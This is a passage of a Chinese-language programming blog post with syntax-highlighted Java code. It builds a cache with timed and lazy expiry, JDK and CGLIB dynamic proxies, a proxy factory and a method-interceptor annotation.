    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExpireThread</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;
            <span class="hljs-comment">//1.判断是否为空</span>
            <span class="hljs-keyword">if</span>(MapUtil.isEmpty(sortMap)) &#123;
                <span class="hljs-keyword">return</span>;
            &#125;

            <span class="hljs-comment">//2. 获取 key 进行处理</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span>(Map.Entry&lt;Long, List&lt;K&gt;&gt; entry : sortMap.entrySet()) &#123;
                <span class="hljs-keyword">final</span> <span class="hljs-type">Long</span> <span class="hljs-variable">expireAt</span> <span class="hljs-operator">=</span> entry.getKey();
                List&lt;K&gt; expireKeys = entry.getValue();

                <span class="hljs-comment">// 判断队列是否为空</span>
                <span class="hljs-keyword">if</span>(CollectionUtil.isEmpty(expireKeys)) &#123;
                    sortMap.remove(expireAt);
                    <span class="hljs-keyword">continue</span>;
                &#125;
                <span class="hljs-keyword">if</span>(count &gt;= LIMIT) &#123;
                    <span class="hljs-keyword">return</span>;
                &#125;

                <span class="hljs-comment">// 删除的逻辑处理</span>
                <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
                <span class="hljs-keyword">if</span>(currentTime &gt;= expireAt) &#123;
                    Iterator&lt;K&gt; iterator = expireKeys.iterator();
                    <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;
                        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> iterator.next();
                        <span class="hljs-comment">// 先移除本身</span>
                        iterator.remove();
                        expireMap.remove(key);

                        <span class="hljs-comment">// 再移除缓存，后续可以通过惰性删除做补偿</span>
                        cache.remove(key);

                        count++;
                    &#125;
                &#125; <span class="hljs-keyword">else</span> &#123;
                    <span class="hljs-comment">// 直接跳过，没有过期的信息</span>
                    <span class="hljs-keyword">return</span>;
                &#125;
            &#125;
        &#125;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">expire</span><span class="hljs-params">(K key, <span class="hljs-type">long</span> expireAt)</span> &#123;
        List&lt;K&gt; keys = sortMap.get(expireAt);
        <span class="hljs-keyword">if</span>(keys == <span class="hljs-literal">null</span>) &#123;
            keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        &#125;
        keys.add(key);

        <span class="hljs-comment">// 设置对应的信息</span>
        sortMap.put(expireAt, keys);
        expireMap.put(key, expireAt);
    &#125;
&#125;</code></pre>



<h3 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h3><p>添加成员变量</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> ICacheExpire&lt;K,V&gt; expire;</code></pre>

<p>构造方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Cache</span><span class="hljs-params">(Map&lt;K, V&gt; map, <span class="hljs-type">int</span> sizeLimit, ICacheEvict&lt;K, V&gt; evict)</span> &#123;
    <span class="hljs-built_in">this</span>.map = map;
    <span class="hljs-built_in">this</span>.sizeLimit = sizeLimit;
    <span class="hljs-built_in">this</span>.evict = evict;
    <span class="hljs-comment">// 修改过期策略时，修改此处即可</span>
    <span class="hljs-built_in">this</span>.expire = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheExpire</span>&lt;&gt;(<span class="hljs-built_in">this</span>);
&#125;</code></pre>

<p>方法实现，为了方便起见，将两种过期方式转换为一种,多长时间后过期</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ICache&lt;K, V&gt; <span class="hljs-title function_">expire</span><span class="hljs-params">(K key, <span class="hljs-type">long</span> timeInMills)</span> &#123;
    <span class="hljs-type">long</span> <span class="hljs-variable">expireTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis() + timeInMills;
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.expireAt(key, expireTime);
&#125;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ICache&lt;K, V&gt; <span class="hljs-title function_">expireAt</span><span class="hljs-params">(K key, <span class="hljs-type">long</span> timeInMills)</span> &#123;
    <span class="hljs-built_in">this</span>.cacheExpire.expire(key, timeInMills);
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
&#125;</code></pre>



<h2 id="惰性删除"><a href="#惰性删除" class="headerlink" title="惰性删除"></a>惰性删除</h2><p>类似于 redis，我们采用定时删除的方案，就有一个问题：可能数据清理的不及时。那当我们查询时，可能获取到到是脏数据。</p>
<p>当我们关心某些数据时，才对数据做对应的删除判断操作，这样压力会小很多。</p>
<p>需要惰性删除的方法：各种数据查询的方法</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>
<span class="hljs-keyword">public</span> V <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;
    <span class="hljs-comment">//1. 刷新所有过期信息</span>
    <span class="hljs-type">K</span> <span class="hljs-variable">genericKey</span> <span class="hljs-operator">=</span> (K) key;
    <span class="hljs-built_in">this</span>.cacheExpire.refreshExpire(Collections.singletonList(genericKey));
    <span class="hljs-keyword">return</span> map.get(key);
&#125;</code></pre>

<p>在获取数据之前对数据进行刷新，就是<code>refreshExpire()</code>函数</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refreshExpire</span><span class="hljs-params">(Collection&lt;K&gt; keyList)</span> &#123;
    <span class="hljs-keyword">if</span>(CollectionUtil.isEmpty(keyList)) &#123;
        <span class="hljs-keyword">return</span>;
    &#125;
    <span class="hljs-comment">// 判断大小。一般都是过期的 keys 比较小。</span>
    <span class="hljs-keyword">if</span>(keyList.size() &lt;= expireMap.size()) &#123;
        <span class="hljs-keyword">for</span>(K key : keyList) &#123;
            expireKey(key);
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">for</span>(Map.Entry&lt;K, Long&gt; entry : expireMap.entrySet()) &#123;
            <span class="hljs-built_in">this</span>.expireKey(entry);
        &#125;
    &#125;
&#125;</code></pre>

<h1 id="创建代理对象"><a href="#创建代理对象" class="headerlink" title="创建代理对象"></a>创建代理对象</h1><h2 id="相关接口-2"><a href="#相关接口-2" class="headerlink" title="相关接口"></a>相关接口</h2><h3 id="ICacheProxy"><a href="#ICacheProxy" class="headerlink" title="ICacheProxy"></a>ICacheProxy</h3><p>因为后面要实现几种类型的代理对象，所以先抽象出一个接口，方便使用</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheProxy</span> &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 获取代理实现</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理</span>
<span class="hljs-comment">     */</span>
    Object <span class="hljs-title function_">proxy</span><span class="hljs-params">()</span>;

&#125;
</code></pre>

<h3 id="ICacheProxyBsContext"><a href="#ICacheProxyBsContext" class="headerlink" title="ICacheProxyBsContext"></a>ICacheProxyBsContext</h3><pre><code class="hljs java">  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 拦截器信息</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span> 拦截器</span>
<span class="hljs-comment">   */</span>
  CacheInterceptor <span class="hljs-title function_">interceptor</span><span class="hljs-params">()</span>;

  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 获取代理对象信息</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span> 代理</span>
<span class="hljs-comment">   */</span>
  ICache <span class="hljs-title function_">target</span><span class="hljs-params">()</span>;

  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 目标对象</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> target 对象</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span> 结果</span>
<span class="hljs-comment">   */</span>
  ICacheProxyBsContext <span class="hljs-title function_">target</span><span class="hljs-params">(<span class="hljs-keyword">final</span> ICache target)</span>;

  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 参数信息</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span> 参数信息</span>
<span class="hljs-comment">   */</span>
  Object[] params();

  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 方法信息</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span> 方法信息</span>
<span class="hljs-comment">   */</span>
  Method <span class="hljs-title function_">method</span><span class="hljs-params">()</span>;

  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 方法执行</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span> 执行</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> Throwable 异常信息</span>
<span class="hljs-comment">   */</span>
Object <span class="hljs-title function_">process</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable;</code></pre>



<h2 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h2><h3 id="CacheProxyBsContext"><a href="#CacheProxyBsContext" class="headerlink" title="CacheProxyBsContext"></a>CacheProxyBsContext</h3><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheProxyBsContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheProxyBsContext</span> &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 代理目标对象</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> ICache target;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 方法执行的参数</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> Object[] params;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 方法</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@since</span> 0.0.4</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> Method method;


    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 新建对象</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 对象</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CacheProxyBsContext <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheProxyBsContext</span>();
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> CacheInterceptor <span class="hljs-title function_">interceptor</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> interceptor;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ICache <span class="hljs-title function_">target</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> target;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ICacheProxyBsContext <span class="hljs-title function_">target</span><span class="hljs-params">(ICache target)</span> &#123;
        <span class="hljs-built_in">this</span>.target = target;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object[] params() &#123;
        <span class="hljs-keyword">return</span>  params;
    &#125;

    <span class="hljs-keyword">public</span> CacheProxyBsContext <span class="hljs-title function_">params</span><span class="hljs-params">(Object[] params)</span> &#123;
        <span class="hljs-built_in">this</span>.params = params;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Method <span class="hljs-title function_">method</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> method;
    &#125;

    <span class="hljs-keyword">public</span> CacheProxyBsContext <span class="hljs-title function_">method</span><span class="hljs-params">(Method method)</span> &#123;
        <span class="hljs-built_in">this</span>.method = method;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">process</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;
        <span class="hljs-comment">//通过反射调用方法 也就是目标代理对象要执行的方法</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.method.invoke(target, params);
    &#125;
&#125;</code></pre>



<h2 id="引导类代理对象"><a href="#引导类代理对象" class="headerlink" title="引导类代理对象"></a>引导类代理对象</h2><p>创建</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheProxyBs</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">CacheProxyBs</span><span class="hljs-params">()</span>&#123;&#125;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 代理上下文</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> ICacheProxyBsContext context;


    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CacheProxyBs <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheProxyBs</span>();
    &#125;

    <span class="hljs-keyword">public</span> CacheProxyBs <span class="hljs-title function_">context</span><span class="hljs-params">(ICacheProxyBsContext context)</span> &#123;
        <span class="hljs-built_in">this</span>.context = context;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 该方法在每个方法执行之前会获取其执行的具体信息</span>
<span class="hljs-comment">     * 包括执方法名，参数，执行结果，执行结果</span>
<span class="hljs-comment">     * 在执行前会打印执行时间</span>
<span class="hljs-comment">     * 然后记录执行时间</span>
<span class="hljs-comment">     * 打印最后的执行时间</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;
        <span class="hljs-type">long</span> <span class="hljs-variable">startMills</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-keyword">final</span> <span class="hljs-type">ICache</span> <span class="hljs-variable">cache</span> <span class="hljs-operator">=</span> context.target();
        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> context.process();
        <span class="hljs-keyword">return</span> result;
    &#125;
&#125;</code></pre>



<h2 id="代理对象"><a href="#代理对象" class="headerlink" title="代理对象"></a>代理对象</h2><p>创建代理对象的目的是为了对Map的原方法进行一些增强，比如统计某次调用的执行时间，可以在调用前记录下时间后，再调用目标对象的方法，之后再用当前时间减去调用前的时间，即可获取本次调用花费的时间。这个可以用于统计慢操作日志，后续会进行开发。</p>
<p>此外结合自定义注解，可以在一些需要加监听器的方法上添加对应注解，即可在调用此方法时，进行一些操作，比如刷新操作。</p>
<h3 id="jdk动态代理"><a href="#jdk动态代理" class="headerlink" title="jdk动态代理"></a>jdk动态代理</h3><p>在java动态代理机制中，<code>InvocationHandler </code>接口和<code> Proxy</code> 类是核心。</p>
<p>Proxy 类中使用频率最高的方法是：newProxyInstance() ，这个方法主要用来生成一个代理对象。</p>
<pre><code class="hljs java"><span class="hljs-meta">@CallerSensitive</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span>
<span class="hljs-params">                                      Class&lt;?&gt;[] interfaces,</span>
<span class="hljs-params">                                      InvocationHandler h)</span></code></pre>

<p>这个方法一共有 3 个参数：</p>
<ul>
<li>loader :类加载器，用于加载代理对象。</li>
<li>interfaces : 被代理类实现的一些接口；</li>
<li>h : 实现了 InvocationHandler 接口的对象；</li>
</ul>
<p>要实现动态代理的话，还必须需要实现InvocationHandler 来自定义处理逻辑。 当我们的动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现InvocationHandler 接口类的 invoke 方法来调用。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">InvocationHandler</span> &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 当你使用代理对象调用方法的时候实际会调用到这个方法</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span>
        <span class="hljs-keyword">throws</span> Throwable;
&#125;</code></pre>

<p><code>invoke()</code>有三个参数</p>
<ul>
<li>proxy :动态生成的代理类</li>
<li>method : 与代理类对象调用的方法相对应</li>
<li>args : 当前 method 方法的参数</li>
</ul>
<p>也就是说：通过Proxy 类的 newProxyInstance() 创建的代理对象在调用方法的时候，实际会调用到实现InvocationHandler 接口的类的 invoke()方法。 你可以在 invoke() 方法中自定义处理逻辑，比如在方法执行前后做什么事情。</p>
<p>JDK 动态代理类使用步骤</p>
<ul>
<li>定义一个接口及其实现类；</li>
<li>自定义<code>InvocationHandler</code>并重写<code>invoke</code>方法，在 <code>invoke</code> 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；</li>
<li>通过 <code>Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) </code>方法创建代理对象；</li>
</ul>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, ICacheProxy &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 被代理的目标对象</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ICache target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DynamicProxy</span><span class="hljs-params">(ICache target)</span> &#123;
        <span class="hljs-built_in">this</span>.target = target;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 这种方式虽然实现了异步执行，但是存在一个缺陷：</span>
<span class="hljs-comment">     * 强制用户返回值为 Future 的子类。</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * 如何实现不影响原来的值，要怎么实现呢？</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy 原始对象</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> method 方法</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args 入参</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 结果</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable 异常</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;
        <span class="hljs-type">ICacheProxyBsContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> CacheProxyBsContext.newInstance()
                .method(method).params(args).target(target);
        <span class="hljs-keyword">return</span> CacheProxyBs.newInstance().context(context).execute();
        <span class="hljs-comment">// execute()</span>
        <span class="hljs-comment">/*</span>
<span class="hljs-comment">        public Object execute() throws Throwable &#123;</span>
<span class="hljs-comment">        long startMills = System.currentTimeMillis();</span>
<span class="hljs-comment">        final ICache cache = context.target();</span>
<span class="hljs-comment">        Object result = context.process();</span>
<span class="hljs-comment">        return result;</span>
<span class="hljs-comment">        */</span>
        
        <span class="hljs-comment">// process() 就是通过反射的方式调用目标对象的方法</span>
        <span class="hljs-comment">// this.method.invoke(target, params);</span>
    &#125;
        
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">proxy</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-comment">// 我们要代理哪个真实对象，就将该对象传进去，最后是通过该真实对象来调用其方法的</span>
        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicProxy</span>(target);

        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(handler.getClass().getClassLoader(),
                target.getClass().getInterfaces(), handler);
    &#125;
&#125;</code></pre>

<h3 id="cglib动态代理"><a href="#cglib动态代理" class="headerlink" title="cglib动态代理"></a>cglib动态代理</h3><p><strong>JDK 动态代理有一个最致命的问题是其只能代理实现了接口的类。</strong></p>
<p><a href="https://github.com/cglib/cglib">CGLIB</a>(Code Generation Library)是一个基于<a href="http://www.baeldung.com/java-asm">ASM</a>的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB 通过继承方式实现代理。很多知名的开源框架都使用到了<a href="https://github.com/cglib/cglib">CGLIB</a>， 例如 Spring 中的 AOP 模块中：如果目标对象实现了接口，则默认采用 JDK 动态代理，否则采用 CGLIB 动态代理。</p>
<p>在CGLIB动态代理机制中<code>MethodInterceptor</code>接口和<code>Enhancer</code>类的核心</p>
<p>所以要自定义自定义 <code>MethodInterceptor </code>并重写<code>intercept</code>方法，<code>intercept </code>用于拦截增强被代理类的方法。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MethodInterceptor</span>
<span class="hljs-keyword">extends</span> <span class="hljs-title class_">Callback</span>&#123;
    <span class="hljs-comment">// 拦截被代理类中的方法</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object obj, java.lang.reflect.Method method, Object[] args,</span>
<span class="hljs-params">                               MethodProxy proxy)</span> <span class="hljs-keyword">throws</span> Throwable;
&#125;</code></pre>

<ul>
<li>obj :被代理的对象（需要增强的对象）</li>
<li>method :被拦截的方法（需要增强的方法）</li>
<li>args :方法入参</li>
<li>methodProxy :用于调用原始方法</li>
</ul>
<p>你可以通过 Enhancer类来动态获取被代理类，当代理类调用方法的时候，实际调用的是 MethodInterceptor 中的 intercept 方法。</p>
<p><strong>CGLIB 动态代理类使用步骤</strong></p>
<ul>
<li>定义一个类；</li>
<li>自定义<code> MethodInterceptor</code> 并重写<code>intercept</code>方法，intercept 用于拦截增强被代理类的方法，和 JDK 动态代理中的 invoke 方法类似；</li>
<li>通过 Enhancer 类的 create()创建代理类；</li>
</ul>
<p>添加maven依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cglib<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>cglib<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<p>代理实现</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CglibProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span>, ICacheProxy &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 被代理的对象</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ICache target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CglibProxy</span><span class="hljs-params">(ICache target)</span> &#123;
        <span class="hljs-built_in">this</span>.target = target;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object o, Method method, Object[] params, MethodProxy methodProxy)</span> <span class="hljs-keyword">throws</span> Throwable &#123;
        <span class="hljs-type">ICacheProxyBsContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> CacheProxyBsContext.newInstance()
                .method(method).params(params).target(target);

        <span class="hljs-keyword">return</span> CacheProxyBs.newInstance().context(context).execute();
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">proxy</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
        <span class="hljs-comment">//目标对象类</span>
        enhancer.setSuperclass(target.getClass());
        enhancer.setCallback(<span class="hljs-built_in">this</span>);
        <span class="hljs-comment">//通过字节码技术创建目标对象类的子类实例作为代理</span>
        <span class="hljs-keyword">return</span> enhancer.create();
    &#125;

&#125;</code></pre>

<h2 id="获取代理对象"><a href="#获取代理对象" class="headerlink" title="获取代理对象"></a>获取代理对象</h2><p>创建一个获取代理对象的工厂类</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheProxy</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">CacheProxy</span><span class="hljs-params">()</span>&#123;&#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 获取对象代理</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;K&gt; 泛型 key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;V&gt; 泛型 value</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cache 对象代理</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理信息</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;K,V&gt; ICache&lt;K,V&gt; <span class="hljs-title function_">getProxy</span><span class="hljs-params">(<span class="hljs-keyword">final</span> ICache&lt;K,V&gt; cache)</span> &#123;
        <span class="hljs-keyword">if</span>(ObjectUtil.isNull(cache)) &#123;
            <span class="hljs-keyword">return</span> (ICache&lt;K,V&gt;) <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoneProxy</span>(cache).proxy();
        &#125;

        <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cache.getClass();

        <span class="hljs-comment">// 如果targetClass本身是个接口或者targetClass是JDK Proxy生成的,则使用JDK动态代理。</span>
        <span class="hljs-comment">// 参考 spring 的 AOP 判断</span>
        <span class="hljs-keyword">if</span> (clazz.isInterface() || Proxy.isProxyClass(clazz)) &#123;
            <span class="hljs-keyword">return</span> (ICache&lt;K,V&gt;) <span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicProxy</span>(cache).proxy();
        &#125;

        <span class="hljs-keyword">return</span> (ICache&lt;K,V&gt;) <span class="hljs-keyword">new</span> <span class="hljs-title class_">CglibProxy</span>(cache).proxy();
    &#125;

&#125;</code></pre>



<h1 id="实现监听器"><a href="#实现监听器" class="headerlink" title="实现监听器"></a>实现监听器</h1><h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><p>该注解的作用域是方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 缓存拦截器注解</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Inherited</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> CacheInterceptor &#123;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 通用拦截器</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * 1. 耗时统计</span>
<span class="hljs-comment">     * 2. 慢日志统计</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * etc.</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 默认开启</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">common</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;
&#125;</code></pre>

<p>那么如何使用注解呢？</p>
<p>创建一个测试类，添加两个公用方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;

    <span class="hljs-meta">@CacheInterceptor</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span>&#123;
        System.out.println(<span class="hljs-string">&quot;test1&quot;</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> &#123;
        System.out.println(<span class="hljs-string">&quot;test2&quot;</span>);
    &#125;
